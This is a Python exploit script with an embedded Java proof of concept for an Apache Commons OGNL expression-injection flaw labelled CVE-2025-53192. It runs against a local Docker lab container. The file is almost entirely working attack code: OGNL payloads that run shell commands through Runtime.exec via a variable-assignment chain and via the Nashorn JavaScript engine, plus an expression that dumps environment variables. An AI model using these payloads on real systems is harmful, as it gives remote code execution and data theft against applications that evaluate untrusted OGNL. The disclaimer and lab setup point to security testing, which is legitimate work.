#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Commons OGNL — Variable Chain + ScriptEngine RCE
# CVE            : CVE-2025-53192
# Vendor         : Apache Software Foundation
# Product        : Apache Commons OGNL
# Affected       : All versions (project retired, no fix)
# Type           : CWE-146 - Expression/Command Delimiter Injection
# CVSS           : 8.8 (HIGH)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-53192 — Vector 3: Advanced Techniques

Sub-vector A: OGNL Variable Assignment Chain
  ASTSequence → ASTAssign + ASTVarRef — splits attack across sub-expressions.

Sub-vector B: Nashorn ScriptEngine Execution
  RCE via JavaScript engine without directly calling Runtime.exec() from OGNL.

Sub-vector C: Environment exfiltration via @System@getenv() (no process spawn).

PREREQUISITES:
  - Python 3 (stdlib only)
  - Docker container 'cve-2025-53192-vulnerable' running

REFERENCES:
  - CVE-2025-53192
  - https://github.com/advisories/GHSA-5vgh-76mj-8hcq
"""

import subprocess
import sys
import textwrap

RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

DEFAULT_CONTAINER = "cve-2025-53192-vulnerable"
CLASSPATH = "/lab:/lab/commons-ognl.jar:/lab/javassist.jar"

JAVA_POC_SOURCE = textwrap.dedent(r'''
    import org.apache.commons.ognl.Ognl;
    import org.apache.commons.ognl.OgnlContext;
    import org.apache.commons.ognl.DefaultClassResolver;
    import org.apache.commons.ognl.DefaultTypeConverter;
    import org.apache.commons.ognl.DefaultMemberAccess;
    import java.io.BufferedReader;
    import java.io.InputStreamReader;

    /**
     * CVE-2025-53192 Vector 3 — Advanced techniques
     *
     * Sub-vector A: OGNL variable assignment chain
     *   Uses ASTSequence + ASTAssign + ASTVarRef — a DIFFERENT code path
     *   from the direct ASTChain used in Vector 1.
     *   The expression: (#rt=@Runtime@getRuntime(), #cmd=new String[]{...}, #rt.exec(#cmd))
     *   splits the attack into separate sub-expressions joined by OGNL's sequence operator.
     *
     * Sub-vector B: Nashorn ScriptEngine
     *   Loads javax.script.ScriptEngineManager, obtains the "js" engine (Nashorn on JDK 11),
     *   and evaluates JavaScript that calls Java APIs — achieving RCE without directly
     *   calling Runtime.exec() from OGNL.
     */
    public class PoCVector3 {
        public static void main(String[] args) throws Exception {
            DefaultMemberAccess memberAccess = new DefaultMemberAccess(false);
            OgnlContext context = new OgnlContext(
                new DefaultClassResolver(),
                new DefaultTypeConverter(),
                memberAccess
            );
            context.setRoot(new Object());

            // === Sub-vector A: OGNL variable chain ===
            // AST path: ASTSequence → [ASTAssign(#rt), ASTAssign(#cmd), ASTMethod(#rt.exec)]
            // This is distinct from Vector 1's ASTChain → [ASTStaticMethod, ASTMethod]
            System.out.println("SUBVECTOR: A - OGNL Variable Assignment Chain");
            String exprA = "(#rt = @java.lang.Runtime@getRuntime(), " +
                           "#cmd = new java.lang.String[]{\"sh\",\"-c\",\"uname -a\"}, " +
                           "#rt.exec(#cmd))";
            System.out.println("OGNL_EXPR_A: " + exprA);

            try {
                Object tree = Ognl.parseExpression(exprA);
                Object result = Ognl.getValue(tree, context, context.getRoot());
                Process proc = (Process) result;
                BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                proc.waitFor();
                System.out.println("OUTPUT_A_START");
                System.out.print(output.toString());
                System.out.println("OUTPUT_A_END");
                System.out.println("STATUS_A: SUCCESS");
            } catch (Exception e) {
                System.out.println("STATUS_A: FAILED - " + e.getMessage());
            }

            System.out.println("---");

            // === Sub-vector B: ScriptEngine (Nashorn JS engine) ===
            // Uses OGNL variable chain to inject command via ScriptEngine.put()
            // then evaluates JavaScript that calls Java Runtime.exec() on the injected variable.
            // This achieves RCE without directly calling exec() from OGNL — the call
            // goes through Nashorn's Java interop: OGNL → ScriptEngine → JavaScript → Java API
            System.out.println("SUBVECTOR: B - Nashorn ScriptEngine Execution");
            String exprB = "(#mgr = new javax.script.ScriptEngineManager(), " +
                          "#eng = #mgr.getEngineByName(\"js\"), " +
                          "#cmd = \"id\", " +
                          "#eng.put(\"cmd\", #cmd), " +
                          "#eng.eval(\"java.lang.Runtime.getRuntime().exec(cmd)\"))";
            System.out.println("OGNL_EXPR_B: " + exprB);

            try {
                Object tree = Ognl.parseExpression(exprB);
                Object result = Ognl.getValue(tree, context, context.getRoot());
                // result is a Process object from Runtime.exec() called via Nashorn
                Process proc = (Process) result;
                BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                proc.waitFor();
                System.out.println("OUTPUT_B_START");
                System.out.print(output.toString());
                System.out.println("OUTPUT_B_END");
                System.out.println("STATUS_B: SUCCESS");
            } catch (Exception e) {
                System.out.println("STATUS_B: FAILED - " + e.getMessage());
            }

            System.out.println("---");

            // === Sub-vector C: Environment/System info exfiltration ===
            // Demonstrates data exfiltration without shell execution
            System.out.println("SUBVECTOR: C - Info Exfiltration (no shell needed)");
            String exprC = "@java.lang.System@getenv()";
            System.out.println("OGNL_EXPR_C: " + exprC);
            try {
                Object tree = Ognl.parseExpression(exprC);
                Object result = Ognl.getValue(tree, context, context.getRoot());
                java.util.Map env = (java.util.Map)result;
                System.out.println("OUTPUT_C_START");
                System.out.println("ENV_VARS_COUNT: " + env.size());
                if (env.containsKey("PATH")) System.out.println("PATH=" + env.get("PATH"));
                if (env.containsKey("JAVA_HOME")) System.out.println("JAVA_HOME=" + env.get("JAVA_HOME"));
                if (env.containsKey("CLASSPATH")) System.out.println("CLASSPATH=" + env.get("CLASSPATH"));
                System.out.println("OUTPUT_C_END");
                System.out.println("STATUS_C: SUCCESS");
            } catch (Exception e) {
                System.out.println("STATUS_C: FAILED - " + e.getMessage());
            }

            System.out.println("---");
            System.out.println("STATUS: SUCCESS");
        }
    }
''').strip()


def run_docker_exec(container, cmd, timeout=30):
    full_cmd = ["docker", "exec", container] + cmd
    try:
        result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"


def copy_to_container(container, content, dest_path):
    full_cmd = ["docker", "exec", "-i", container, "sh", "-c", f"cat > {dest_path}"]
    try:
        result = subprocess.run(full_cmd, input=content, capture_output=True, text=True, timeout=10)
        return result.returncode == 0
    except Exception:
        return False


def extract_block(stdout, start_marker, end_marker):
    """Extract text between markers from stdout."""
    lines = []
    in_block = False
    for line in stdout.splitlines():
        if line.strip() == start_marker:
            in_block = True
            continue
        if line.strip() == end_marker:
            in_block = False
            continue
        if in_block:
            lines.append(line)
    return "\n".join(lines)


def exploit(container):
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}  CVE-2025-53192 Vector 3: Advanced Techniques{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print()
    print(f"  {YELLOW}Sub-vector A:{RESET} OGNL variable chain (ASTSequence + ASTAssign)")
    print(f"  {YELLOW}Sub-vector B:{RESET} Nashorn ScriptEngine (JavaScript → Java RCE)")
    print(f"  {YELLOW}Sub-vector C:{RESET} Environment exfiltration (no shell process)")
    print()

    # Deploy, compile, run
    print(f"  [1/3] Deploying exploit...", end=" ")
    if not copy_to_container(container, JAVA_POC_SOURCE, "/lab/PoCVector3.java"):
        print(f"{RED}FAILED{RESET}")
        return False
    print(f"{GREEN}OK{RESET}")

    print(f"  [2/3] Compiling...", end=" ")
    rc, _, stderr = run_docker_exec(container, ["javac", "-cp", CLASSPATH, "/lab/PoCVector3.java"])
    if rc != 0:
        print(f"{RED}FAILED{RESET}\n  {stderr}")
        return False
    print(f"{GREEN}OK{RESET}")

    print(f"  [3/3] Executing advanced techniques...", end=" ")
    rc, stdout, stderr = run_docker_exec(container, ["java", "-cp", CLASSPATH, "PoCVector3"])

    if "STATUS: SUCCESS" not in stdout:
        print(f"{RED}FAILED{RESET}")
        print(f"  stdout: {stdout}")
        return False
    print(f"{GREEN}OK{RESET}")
    print()

    results = {}

    # Sub-vector A
    output_a = extract_block(stdout, "OUTPUT_A_START", "OUTPUT_A_END")
    status_a = "STATUS_A: SUCCESS" in stdout
    print(f"  {CYAN}[Sub-vector A] OGNL Variable Assignment Chain:{RESET}")
    print(f"  {YELLOW}AST path:{RESET} ASTSequence → ASTAssign(#rt) → ASTAssign(#cmd) → ASTMethod(#rt.exec)")
    if status_a and output_a.strip():
        print(f"  {GREEN}[SUCCEEDED]{RESET} → {RED}{output_a.strip()}{RESET}")
    else:
        print(f"  {RED}[FAILED]{RESET}")
    results["A"] = status_a
    print()

    # Sub-vector B
    output_b = extract_block(stdout, "OUTPUT_B_START", "OUTPUT_B_END")
    status_b = "STATUS_B: SUCCESS" in stdout
    print(f"  {CYAN}[Sub-vector B] Nashorn ScriptEngine Execution:{RESET}")
    print(f"  {YELLOW}Technique:{RESET} OGNL creates ScriptEngineManager → JS engine → eval(JavaScript)")
    if status_b and output_b.strip():
        print(f"  {GREEN}[SUCCEEDED]{RESET} → {RED}{output_b.strip()}{RESET}")
        print(f"  {YELLOW}Note:{RESET} RCE achieved WITHOUT directly calling Runtime.exec() from OGNL")
    else:
        print(f"  {RED}[FAILED]{RESET}")
    results["B"] = status_b
    print()

    # Sub-vector C
    output_c = extract_block(stdout, "OUTPUT_C_START", "OUTPUT_C_END")
    status_c = "STATUS_C: SUCCESS" in stdout
    print(f"  {CYAN}[Sub-vector C] Environment Variable Exfiltration:{RESET}")
    if status_c and output_c.strip():
        print(f"  {RED}┌──────────────────────────────────────────────{RESET}")
        for line in output_c.strip().splitlines():
            print(f"  {RED}│ {line}{RESET}")
        print(f"  {RED}└──────────────────────────────────────────────{RESET}")
        print(f"  {GREEN}✓ Info exfiltration without spawning any process{RESET}")
    else:
        print(f"  {RED}[FAILED]{RESET}")
    results["C"] = status_c
    print()

    all_ok = all(results.values())
    if all_ok:
        print(f"  {GREEN}✓ All 3 advanced techniques confirmed{RESET}")
    else:
        passed = sum(1 for v in results.values() if v)
        total = len(results)
        print(f"  {YELLOW}⚠ {passed}/{total} techniques succeeded{RESET}")

    return all_ok


if __name__ == "__main__":
    container = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_CONTAINER
    success = exploit(container)
    sys.exit(0 if success else 1)
